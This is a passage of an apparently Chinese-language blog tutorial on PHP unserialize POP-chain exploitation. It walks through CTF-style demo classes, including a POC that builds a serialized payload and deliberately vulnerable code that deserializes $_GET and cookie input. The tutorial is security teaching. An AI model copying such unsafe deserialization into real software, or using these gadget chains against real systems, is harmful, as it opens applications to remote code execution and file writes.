class="string">&quot;flag:&quot;</span>.<span class="string">&quot;xxxxxxxxxxxx&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;string&#x27;</span>];</span><br><span class="line">unserialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>从前往后跟 or 从后往前跟？</p>
<p>POC</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">start_gg</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> Call();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1-&gt;test1(); <span class="comment"># 入口点，mod1可通过附值起跳。</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Call</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>; <span class="comment"># 实例化funct</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>; <span class="comment"># 无它什么事</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 继续起跳，瞻前顾后，思考下面的 $this-&gt;mod1-&gt;test2();会在何处被什么利用</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> funct();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test1</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1-&gt;test2(); <span class="comment"># 这里调 __call</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">funct</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>; <span class="comment"># 实例化func</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>; <span class="comment"># 无它什么事</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> func();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$test2</span>, <span class="variable">$arr</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$s1</span> = <span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">        <span class="variable">$s1</span>(); <span class="comment"># 这里触发 __invoke</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">func</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod1</span>; <span class="comment"># 实例化string1</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mod2</span>; <span class="comment"># __invoke对其附值，其实是为了调 __toString</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> string1();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod2 = <span class="string">&quot;字符串拼接&quot;</span> . <span class="keyword">$this</span>-&gt;mod1; <span class="comment"># 这里若拼接则会触发 __toString</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">string1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str1</span>; <span class="comment"># 实例化 GetFlag</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str1 = <span class="keyword">new</span> GetFlag();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str1-&gt;get_flag(); <span class="comment">#调用此处即可getflag，难点：需调用 __toString</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;flag:&quot;</span> . <span class="string">&quot;xxxxxxxxxxxx&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$payload</span> = <span class="keyword">new</span> start_gg();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$payload</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<h3 id="demo2"><a href="#demo2" class="headerlink" title="demo2"></a>demo2</h3><p>demo引用自 @l3mon师傅 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/iamstudy/articles/php_unserialize_pop_2.html">blog</a> 里的代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OutputFilter</span> </span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$matchPattern</span>;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$replacement</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$pattern</span>, <span class="variable">$repl</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;matchPattern = <span class="variable">$pattern</span>;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;replacement = <span class="variable">$repl</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="keyword">$this</span>-&gt;matchPattern, <span class="keyword">$this</span>-&gt;replacement, <span class="variable">$data</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LogFileFormat</span> </span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$filters</span>;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$endl</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filters</span>, <span class="variable">$endl</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;filters = <span class="variable">$filters</span>;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;endl = <span class="variable">$endl</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">format</span>(<span class="params"><span class="variable">$txt</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;filters <span class="keyword">as</span> <span class="variable">$filter</span>) &#123;</span><br><span class="line">      <span class="variable">$txt</span> = <span class="variable">$filter</span>-&gt;filter(<span class="variable">$txt</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$txt</span> = str_replace(<span class="string">&#x27;\n&#x27;</span>, <span class="keyword">$this</span>-&gt;endl, <span class="variable">$txt</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$txt</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LogWriter_File</span> </span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$format</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$format</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;filename = str_replace(<span class="string">&quot;..&quot;</span>, <span class="string">&quot;__&quot;</span>, str_replace(<span class="string">&quot;/&quot;</span>, <span class="string">&quot;_&quot;</span>, <span class="variable">$filename</span>));</span><br><span class="line">    <span class="keyword">$this</span>-&gt;format = <span class="variable">$format</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">writeLog</span>(<span class="params"><span class="variable">$txt</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$txt</span> = <span class="keyword">$this</span>-&gt;format-&gt;format(<span class="variable">$txt</span>);</span><br><span class="line">    <span class="comment">//<span class="doctag">TODO:</span> Modify the address here, and delete this TODO.</span></span><br><span class="line">    file_put_contents(<span class="string">&quot;C:\\WWW\\test\\ctf\\kon\\&quot;</span> . <span class="keyword">$this</span>-&gt;filename, <span class="variable">$txt</span>, FILE_APPEND);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Logger</span> </span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$logwriter</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$writer</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;logwriter = <span class="variable">$writer</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params"><span class="variable">$txt</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;logwriter-&gt;writeLog(<span class="variable">$txt</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Song</span> </span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$logger</span>;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$name</span>;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$group</span>;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$url</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$group</span>, <span class="variable">$url</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;group = <span class="variable">$group</span>;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;url = <span class="variable">$url</span>;</span><br><span class="line">    <span class="variable">$fltr</span> = <span class="keyword">new</span> OutputFilter(<span class="string">&quot;/\[i\](.*)\[\/i\]/i&quot;</span>, <span class="string">&quot;&lt;i&gt;\\1&lt;/i&gt;&quot;</span>);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;logger = <span class="keyword">new</span> Logger(<span class="keyword">new</span> LogWriter_File(<span class="string">&quot;song_views&quot;</span>, <span class="keyword">new</span> LogFileFormat(<span class="keyword">array</span>(<span class="variable">$fltr</span>), <span class="string">&quot;\n&quot;</span>)));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&lt;a href=&#x27;&quot;</span> . <span class="keyword">$this</span>-&gt;url . <span class="string">&quot;&#x27;&gt;&lt;i&gt;&quot;</span> . <span class="keyword">$this</span>-&gt;name . <span class="string">&quot;&lt;/i&gt;&lt;/a&gt; by &quot;</span> . <span class="keyword">$this</span>-&gt;group;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;logger-&gt;log(<span class="string">&quot;Song &quot;</span> . <span class="keyword">$this</span>-&gt;name . <span class="string">&quot; by [i]&quot;</span> . <span class="keyword">$this</span>-&gt;group . <span class="string">&quot;[/i] viewed.\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">get_name</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Lyrics</span> </span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$lyrics</span>;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$song</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$lyrics</span>, <span class="variable">$song</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;song = <span class="variable">$song</span>;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;lyrics = <span class="variable">$lyrics</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&lt;p&gt;&quot;</span> . <span class="keyword">$this</span>-&gt;song-&gt;__toString() . <span class="string">&quot;&lt;/p&gt;&lt;p&gt;&quot;</span> . str_replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&lt;br /&gt;&quot;</span>, <span class="keyword">$this</span>-&gt;lyrics) . <span class="string">&quot;&lt;/p&gt;\n&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;song-&gt;log();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">shortForm</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&lt;p&gt;&lt;a href=&#x27;song.php?name=&quot;</span> . urlencode(<span class="keyword">$this</span>-&gt;song-&gt;get_name()) . <span class="string">&quot;&#x27;&gt;&quot;</span> . <span class="keyword">$this</span>-&gt;song-&gt;get_name() . <span class="string">&quot;&lt;/a&gt;&lt;/p&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">name_is</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;song-&gt;get_name() === <span class="variable">$name</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">  <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">addLyrics</span>(<span class="params"><span class="variable">$lyrics</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$oldlyrics</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;lyrics&#x27;</span>])) &#123;</span><br><span class="line">      <span class="variable">$oldlyrics</span> = unserialize(base64_decode(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;lyrics&#x27;</span>]));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$lyrics</span> <span class="keyword">as</span> <span class="variable">$lyric</span>) <span class="variable">$oldlyrics</span> []= <span class="variable">$lyric</span>;</span><br><span class="line">    setcookie(<span class="string">&#x27;lyrics&#x27;</span>, base64_encode(serialize(<span class="variable">$oldlyrics</span>)));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getLyrics</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;lyrics&#x27;</span>])) &#123;</span><br><span class="line">      <span class="keyword">return</span> unserialize(base64_decode(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;lyrics&#x27;</span>]));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      setcookie(<span class="string">&#x27;lyrics&#x27;</span>, base64_encode(serialize(<span class="keyword">array</span>(<span class="number">1</span>, <span class="number">2</span>))));</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">array</span>(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Porter</span> </span>&#123;</span><br><span class="line">  <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">exportData</span>(<span class="params"><span class="variable">$lyrics</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> base64_encode(serialize(<span class="variable">$lyrics</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">importData</span>(<span class="params"><span class="variable">$lyrics</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> serialize(base64_decode(<span class="variable">$lyrics</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Conn</span> </span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$conn</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$dbuser</span>, <span class="variable">$dbpass</span>, <span class="variable">$db</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;conn = mysqli_connect(<span class="string">&quot;localhost&quot;</span>, <span class="variable">$dbuser</span>, <span class="variable">$dbpass</span>, <span class="variable">$db</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">getLyrics</span>(<span class="params"><span class="variable">$lyrics</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$lyrics</span> <span class="keyword">as</span> <span class="variable">$lyric</span>) &#123;</span><br><span class="line">      <span class="variable">$s</span> = intval(<span class="variable">$lyric</span>);</span><br><span class="line">      <span class="variable">$result</span> = <span class="keyword">$this</span>-&gt;conn-&gt;query(<span class="string">&quot;SELECT data FROM lyrics WHERE id=<span class="subst">$s</span>&quot;</span>);</span><br><span class="line">      <span class="keyword">while</span> ((<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;fetch_row()) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="variable">$r</span> []= unserialize(base64_decode(<span class="variable">$row</span>[<span class="number">0</span>]));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$r</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">addLyrics</span>(<span class="params"><span class="variable">$lyrics</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$ids</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$lyrics</span> <span class="keyword">as</span> <span class="variable">$lyric</span>) &#123;</span><br><span class="line">      <span class="keyword">$this</span>-&gt;conn-&gt;query(<span class="string">&quot;INSERT INTO lyrics (data) VALUES (\&quot;&quot;</span> . base64_encode(serialize(<span class="variable">$lyric</span>)) . <span class="string">&quot;\&quot;)&quot;</span>);</span><br><span class="line">      <span class="variable">$res</span> = <span class="keyword">$this</span>-&gt;conn-&gt;query(<span class="string">&quot;SELECT MAX(id) FROM lyrics&quot;</span>);</span><br><span class="line">      <span class="variable">$id</span>= <span class="variable">$res</span>-&gt;fetch_row(); <span class="variable">$ids</span>[]= intval(<span class="variable">$id</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> var_dump(<span class="variable">$ids</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$ids</span>; </span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;conn-&gt;close();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;conn = <span class="literal">NULL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line">unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>反序列化函数 + 可控参数 == 控制当前作用域下对象</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">  <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">addLyrics</span>(<span class="params"><span class="variable">$lyrics</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$oldlyrics</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;lyrics&#x27;</span>])) &#123;</span><br><span class="line">      <span class="variable">$oldlyrics</span> = unserialize(base64_decode(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;lyrics&#x27;</span>]));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$lyrics</span> <span class="keyword">as</span> <span class="variable">$lyric</span>) <span class="variable">$oldlyrics</span> []= <span class="variable">$lyric</span>;</span><br><span class="line">    setcookie(<span class="string">&#x27;lyrics&#x27;</span>, base64_encode(serialize(<span class="variable">$oldlyrics</span>)));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getLyrics</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;lyrics&#x27;</span>])) &#123;</span><br><span class="line">      <span class="keyword">return</span> unserialize(base64_decode(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;lyrics&#x27;</span>]));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      setcookie(<span class="string">&#x27;lyrics&#x27;</span>, base64_encode(serialize(<span class="keyword">array</span>(<span class="number">1</span>, <span class="number">2</span>))));</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">array</span>(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>自定义 $song 值 + __destruct == 调用当前作用域下 log方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Lyrics</span> </span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$lyrics</span>;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$song</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$lyrics</span>, <span class="variable">$song</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;song = <span class="variable">$song</span>;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;lyrics = <span class="variable">$lyrics</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&lt;p&gt;&quot;</span> . <span class="keyword">$this</span>-&gt;song-&gt;__toString() . <span class="string">&quot;&lt;/p&gt;&lt;p&gt;&quot;</span> . str_replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&lt;br /&gt;&quot;</span>, <span class="keyword">$this</span>-&gt;lyrics) . <span class="string">&quot;&lt;/p&gt;\n&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;song-&gt;log();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">shortForm</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&lt;p&gt;&lt;a href=&#x27;song.php?name=&quot;</span> . urlencode(<span class="keyword">$this</span>-&gt;song-&gt;get_name()) . <span class="string">&quot;&#x27;&gt;&quot;</span> . <span class="keyword">$this</span>-&gt;song-&gt;get_name() . <span class="string">&quot;&lt;/a&gt;&lt;/p&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">name_is</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;song-&gt;get_name() === <span class="variable">$name</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>论两个 log 方法的选择</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Logger</span> </span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$logwriter</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$writer</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;logwriter = <span class="variable">$writer</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params"><span class="variable">$txt</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;logwriter-&gt;writeLog(<span class="variable">$txt</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Song</span> </span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$logger</span>;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$name</span>;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$group</span>;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$url</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$group</span>, <span class="variable">$url</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;group = <span class="variable">$group</span>;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;url = <span class="variable">$url</span>;</span><br><span class="line">    <span class="variable">$fltr</span> = <span class="keyword">new</span> OutputFilter(<span class="string">&quot;/\[i\](.*)\[\/i\]/i&quot;</span>, <span 